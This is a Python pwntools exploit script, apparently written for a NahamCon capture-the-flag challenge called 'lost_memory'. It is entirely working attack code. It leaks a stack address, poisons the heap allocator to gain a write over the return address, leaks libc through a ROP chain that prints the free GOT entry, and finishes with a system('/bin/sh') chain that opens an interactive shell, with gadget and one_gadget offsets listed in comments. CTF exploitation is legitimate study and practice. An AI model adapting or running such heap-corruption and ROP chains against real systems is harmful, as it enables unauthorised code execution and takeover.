from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./lost_memory"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc = elf.libc


if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("challenge.nahamcon.com", 30318)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


def add(size):
    io.sendlineafter("choice", "1")
    io.sendlineafter("would you like?", str(size))

def edit(contend):
    io.sendlineafter("choice", "2")
    io.sendlineafter("like to write?", contend)

def delete():
    io.sendlineafter("choice", "4")

def switch(idx):
    io.sendlineafter("choice", "3")
    io.sendlineafter("Select an index", str(idx))

def restore():
    io.sendlineafter("choice", "5")
    io.recvuntil("0x", drop=True)

def exit():
    io.sendlineafter("choice", "6")

p_chunk =  0x4041C0

payload = b""
# io.sendline(payload)
add(0x80)
restore()

stack = int(io.recv(12), 16)
rbp = stack + 0x18
log.success("rbp:-----> " + hex(rbp))

switch(1)
add(0x80)
switch(0)
delete()
switch(1)
delete()

edit(p64(rbp+8))
switch(1)
add(0x80)
switch(0)
add(0x80) #1--> rbp+8

pop_rdi = 0x000000000040132e
puts_addr = 0x4013C9
vuln_addr = 0x4013F6
free_got = elf.got["free"]
edit(p64(pop_rdi) + p64(free_got) + p64(puts_addr) + p64(rbp+0x200)+ p64(vuln_addr))


exit()
free_got = u64(io.recvuntil("\x79")[-6:].ljust(8, b"\x00"))
libc.address = free_got - libc.symbols["free"]
log.success("libc.address:-----> " + hex(libc.address))


"""
0xe3afe execve("/bin/sh", r15, r12)
0xe3b01 execve("/bin/sh", r15, rdx)
0xe3b04 execve("/bin/sh", rsi, rdx)
"""
ddebug("b *0x40175b\ncontinue")
one=libc.address + 0xe3afe
edit(
        p64(pop_rdi)+p64(1)+
        p64(pop_rdi)+p64(1)+
        # p64(0x0000000000401016 )+ 
        # p64(0)+
        p64(0x000000000040101a )+
        p64(pop_rdi)+ 
        p64(next(libc.search("/bin/sh")))+
        p64(libc.symbols["system"])
)
# exit()

"""
0x0000000000401332 : pop rcx ; ret
0x000000000040132e : pop rdi ; ret
0x0000000000401334 : pop rdx ; ret
0x0000000000401330 : pop rsi ; ret
"""

io.interactive()
